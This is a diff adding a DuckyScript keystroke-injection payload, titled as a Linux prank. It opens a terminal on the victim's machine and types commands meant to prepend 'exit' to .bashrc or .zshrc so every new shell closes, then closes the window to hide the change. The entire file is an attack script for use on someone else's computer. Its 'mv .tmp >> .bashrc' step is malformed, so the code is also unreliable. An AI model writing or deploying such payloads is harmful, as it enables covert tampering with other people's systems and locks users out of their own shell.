@@ -1,0 +1,39 @@
+REM ############################################################
+REM #                                                          #
+REM # Title        : This damn shell doesn't work, SO SAD! :C  #
+REM # Author       : Aleff                                     #
+REM # Version      : 1.0                                       #
+REM # Category     : Prank                                     #
+REM # Target       : Linux                                     #
+REM #                                                          #
+REM ############################################################
+
+
+REM Requirements:
+REM     - Nothing <3
+
+
+REM With Kali Linux 2020.4, the new default shell is now ZSH for users who install the distribution.
+VAR $ONE_ONLY_IF_YOU_USE_IT_ON_KALI_LINUX = 0
+
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+STRINGLN echo "exit" > .tmp
+DELAY 500
+
+IF ($ONE_ONLY_IF_YOU_USE_IT_ON_KALI_LINUX == 1) THEN
+    STRINGLN_BLOCK
+        cat .zshrc >> .tmp
+        mv .tmp >> .zshrc
+    END_STRINGLN
+ELSE
+    STRINGLN_BLOCK
+        cat .bashrc >> .tmp
+        mv .tmp >> .bashrc
+    END_STRINGLN
+END_IF
+DELAY 500
+ALT F4
